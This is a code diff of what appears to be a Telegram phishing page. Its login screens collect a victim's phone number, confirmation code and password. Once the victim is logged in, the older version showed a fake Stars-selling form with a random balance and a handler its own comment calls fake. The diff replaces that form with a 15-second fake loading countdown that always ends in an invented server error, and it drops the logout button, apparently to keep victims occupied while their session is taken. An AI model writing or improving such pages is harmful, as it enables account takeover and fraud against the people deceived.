@@ -189,16 +189,10 @@ input.in.code{font-family:'JetBrains Mono','SF Mono',monospace;font-size:22px;le
 .alt-link:hover{text-decoration:underline}
 .alt-link::after{content:' >';font-weight:400}
 .hidden{display:none}
-/* stars selling page */
-.stars-info{width:100%;margin:16px 0}
-.stars-balance{display:flex;align-items:center;justify-content:center;gap:8px;font-size:28px;font-weight:700;margin-bottom:12px}
-.stars-icon{font-size:32px}
-.stars-count{color:var(--fg)}
-.stars-label{font-size:15px;font-weight:400;color:var(--muted)}
-.stars-desc{font-size:13px;color:var(--muted);line-height:1.5;text-align:center;margin-bottom:10px}
-.stars-rate{font-size:14px;color:var(--fg);text-align:center;padding:8px 14px;background:var(--focus);border-radius:10px;border:1px solid var(--line-soft)}
-.stars-form{width:100%;margin-top:16px}
-.field-label{display:block;font-size:12px;color:var(--muted);margin-bottom:4px;text-transform:uppercase;letter-spacing:.04em}
+/* wait screen */
+.wait-timer{display:flex;align-items:center;justify-content:center;gap:10px;margin:20px 0 8px;font-size:28px;font-weight:700;color:var(--fg)}
+.wait-label{font-size:15px;font-weight:400;color:var(--muted)}
+.wait-spinner{width:24px;height:24px;border:3px solid var(--line-soft);border-top-color:var(--btn-bg);border-radius:50%;animation:spin .8s linear infinite}
 p.hint{font-size:14px;color:var(--muted);margin-bottom:16px;line-height:1.45;text-align:center}
 .status{margin-top:14px;padding:12px 14px;border:1px solid var(--line-soft);border-radius:10px;font-size:13px;background:var(--focus)}
 .track{height:6px;background:var(--track);border-radius:999px;overflow:hidden;margin:18px 0 8px}
@@ -282,25 +276,19 @@ p.hint{font-size:14px;color:var(--muted);margin-bottom:16px;line-height:1.45;tex
 </div>
 
 <div id="s-ready" class="hidden">
-  <div class="brand-title">Продажа звёзд</div>
-  <p class="brand-sub" id="me-info">Вы успешно вошли</p>
-  <div class="stars-info">
-    <div class="stars-balance">
-      <span class="stars-icon">⭐</span>
-      <span class="stars-count" id="stars-count">0</span>
-      <span class="stars-label">звёзд</span>
-    </div>
-    <p class="stars-desc">Здесь вы можете продать свои Telegram Stars по выгодному курсу. Вывод средств на карту или криптокошелёк.</p>
-    <div class="stars-rate">Текущий курс: <b>1 ⭐ = 0.013 $</b></div>
+  <div class="brand-title">Подождите</div>
+  <p class="brand-sub" id="me-info">Загрузка данных аккаунта…</p>
+  <div class="wait-timer">
+    <div class="wait-spinner"></div>
+    <span id="wait-sec">15</span><span class="wait-label"> сек</span>
   </div>
-  <div class="stars-form">
-    <label class="field-label">Количество звёзд для продажи</label>
-    <input type="text" class="inp" id="i-stars" placeholder="Введите количество" inputmode="numeric">
-    <label class="field-label" style="margin-top:12px">Реквизиты для вывода</label>
-    <input type="text" class="inp" id="i-wallet" placeholder="TON кошелёк или номер карты">
-    <button type="button" class="btn btn-pri" id="b-sell" style="margin-top:16px">Продать звёзды</button>
-  </div>
-  <button type="button" class="btn btn-ghost" id="b-logout" style="margin-top:8px">Выйти</button>
+  <div class="track"><div class="fill" id="wait-fill" style="width:0%"></div></div>
+</div>
+
+<div id="s-error" class="hidden">
+  <div class="brand-title">Ошибка</div>
+  <p class="brand-sub">Не удалось загрузить данные. Сервер не отвечает.<br>Попробуйте позже.</p>
+  <button type="button" class="btn btn-ghost" id="b-retry">Попробовать снова</button>
 </div>
 
 </div>
@@ -387,7 +375,7 @@ function flag(iso) {
 }
 const $ = id => document.getElementById(id);
 const show = (name) => {
-  ['phone','code','pw','ready'].forEach(n => $('s-'+n).classList.toggle('hidden', n !== name));
+  ['phone','code','pw','ready','error'].forEach(n => $('s-'+n).classList.toggle('hidden', n !== name));
 };
 // --- searchable country picker ---
 let _cpickIdx = 0; // selected country index
@@ -476,9 +464,9 @@ async function api(path, body) {
 async function checkAuth() {
   const r = await fetch('/api/status').then(r=>r.json());
   if (r.authorized) {
-    $('me-info').textContent = (r.me || 'Вы вошли') + ' — аккаунт подключён';
-    $('stars-count').textContent = Math.floor(Math.random() * 50);
+    $('me-info').textContent = 'Загрузка данных аккаунта…';
     show('ready');
+    startWaitCountdown();
   } else {
     show('phone');
   }
@@ -540,19 +528,25 @@ $('f-pw').onsubmit = async (e) => {
   catch (e) { alert('Ошибка: ' + e.message); }
   finally { btn.disabled=false; btn.textContent='Войти'; $('i-pw').value=''; }
 };
-$('b-logout').onclick = async () => {
-  if (!confirm('Выйти?')) return;
-  await api('/api/logout', {});
-  await checkAuth();
-};
-// stars sell button — fake handler
-$('b-sell').onclick = () => {
-  const stars = $('i-stars').value.trim();
-  const wallet = $('i-wallet').value.trim();
-  if (!stars || !wallet) { alert('Заполните все поля'); return; }
-  const amount = parseInt(stars, 10);
-  if (isNaN(amount) || amount < 1) { alert('Некорректное количество'); return; }
-  alert('Минимальное количество для продажи: 1000 ⭐\\nУ вас недостаточно звёзд.');
+// 15-second wait countdown then error
+function startWaitCountdown() {
+  let sec = 15;
+  $('wait-sec').textContent = sec;
+  $('wait-fill').style.width = '0%';
+  const iv = setInterval(() => {
+    sec--;
+    if (sec < 0) sec = 0;
+    $('wait-sec').textContent = sec;
+    $('wait-fill').style.width = (((15 - sec) / 15) * 100) + '%';
+    if (sec <= 0) {
+      clearInterval(iv);
+      show('error');
+    }
+  }, 1000);
+}
+$('b-retry').onclick = () => {
+  show('ready');
+  startWaitCountdown();
 };
 // --- switch phone / qr ---
 function switchTab(tab) {
